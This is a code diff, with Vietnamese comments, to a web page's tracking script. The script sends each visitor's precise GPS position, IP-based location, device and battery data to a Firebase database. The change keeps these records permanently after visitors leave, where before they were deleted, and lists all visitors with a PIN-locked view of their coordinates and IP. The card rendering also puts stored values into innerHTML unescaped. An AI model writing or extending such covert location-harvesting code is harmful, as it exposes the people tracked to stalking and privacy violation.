@@ -189,79 +189,79 @@
         }
 
         async function startTracking() {
-            const info = await getSystemData();
+    const info = await getSystemData();
 
-            const pushData = (lat, lng, mode) => {
-                const myData = {
-                    lat: lat,
-                    lng: lng,
-                    mode: mode,
-                    deviceInfo: info,
-                    time: new Date().toLocaleTimeString('vi-VN')
-                };
+    const pushData = (lat, lng, mode) => {
+        const myData = {
+            lat: lat,
+            lng: lng,
+            mode: mode,
+            deviceInfo: info,
+            status: "🟢 Đang Online", // Trạng thái khi đang mở web
+            time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
+        };
 
-                allUsersData[myUserId] = myData;
-                renderUserList();
-
-                if (db) {
-                    db.ref('network_users/' + myUserId).set(myData);
-                    db.ref('network_users/' + myUserId).onDisconnect().remove();
-                }
-            };
-
-            if ("geolocation" in navigator) {
-                navigator.geolocation.watchPosition(
-                    (pos) => pushData(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
-                    (err) => pushData(info.lat, info.lng, "Ước Tính Qua IP"),
-                    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
-                );
-            } else {
-                pushData(info.lat, info.lng, "Ước Tính Qua IP");
-            }
-        }
+        allUsersData[myUserId] = myData;
+        renderUserList();
 
         if (db) {
-            db.ref('network_users').on('value', (snapshot) => {
-                const remoteData = snapshot.val() || {};
-                allUsersData = { ...remoteData };
-                renderUserList();
-            });
+            // 1. Lưu/Cập nhật thông tin thiết bị lên Firebase (Lưu mãi mãi)
+            db.ref('network_users/' + myUserId).set(myData);
+
+            // 2. Bỏ lệnh remove() cũ. Khi họ thoát web, chỉ chuyển trạng thái thành Offline chứ KHÔNG XÓA DỮ LIỆU
+            db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
+            db.ref('network_users/' + myUserId + '/lastSeen').onDisconnect().set(new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN'));
         }
+    };
+
+    if ("geolocation" in navigator) {
+        navigator.geolocation.watchPosition(
+            (pos) => pushData(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
+            (err) => pushData(info.lat, info.lng, "Ưước Tính Qua IP"),
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+        );
+    } else {
+        pushData(info.lat, info.lng, "Ước Tính Qua IP");
+    }
+}
+
 
         function renderUserList() {
-            const listEl = document.getElementById('userList');
-            if (!listEl) return;
-            
-            listEl.innerHTML = "";
+    const listEl = document.getElementById('userList');
+    if (!listEl) return;
+    
+    listEl.innerHTML = "";
 
-            Object.keys(allUsersData).forEach((id) => {
-                const u = allUsersData[id];
-                const info = u.deviceInfo || {};
-                const isMe = id === myUserId;
+    Object.keys(allUsersData).forEach((id) => {
+        const u = allUsersData[id];
+        const info = u.deviceInfo || {};
+        const isMe = id === myUserId;
+        const statusText = u.status || "🔴 Đã Thoát Web";
 
-                const card = document.createElement('div');
-                card.className = `user-card ${isMe ? 'is-me' : ''}`;
-                card.onclick = () => openUserDetail(id);
+        const card = document.createElement('div');
+        card.className = `user-card ${isMe ? 'is-me' : ''}`;
+        card.onclick = () => openUserDetail(id);
 
-                card.innerHTML = `
-                    <div>
-                        <div class="device-title">
-                            ${info.device || 'Thiết bị ẩn'} 
-                            ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
-                        </div>
-                        <div class="basic-info">
-                            Hệ điều hành: <b>${info.os || 'N/A'}</b><br>
-                            Cập nhật: ${u.time || 'N/A'}
-                        </div>
-                    </div>
-                    <div style="text-align: right;">
-                        <div class="battery-text">${info.battery || 'N/A'}</div>
-                        <div style="font-size: 11px; color: #0088ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
-                    </div>
-                `;
-                listEl.appendChild(card);
-            });
-        }
+        card.innerHTML = `
+            <div>
+                <div class="device-title">
+                    ${info.device || 'Thiết bị ẩn'} 
+                    ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
+                </div>
+                <div class="basic-info">
+                    Trạng thái: <b>${statusText}</b><br>
+                    Cập nhật: ${u.time || 'N/A'}
+                </div>
+            </div>
+            <div style="text-align: right;">
+                <div class="battery-text">${info.battery || 'N/A'}</div>
+                <div style="font-size: 11px; color: #0088ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
+            </div>
+        `;
+        listEl.appendChild(card);
+    });
+}
+
 
         function openUserDetail(userId) {
             const inputPin = prompt("🔑 Nhập Mật Khẩu để mở khóa Tọa Độ GPS & Địa Chỉ IP:");
